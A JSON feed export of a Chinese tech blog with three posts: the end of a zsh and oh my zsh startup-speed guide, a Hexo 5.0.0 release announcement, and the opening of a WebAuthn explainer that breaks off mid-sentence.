lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 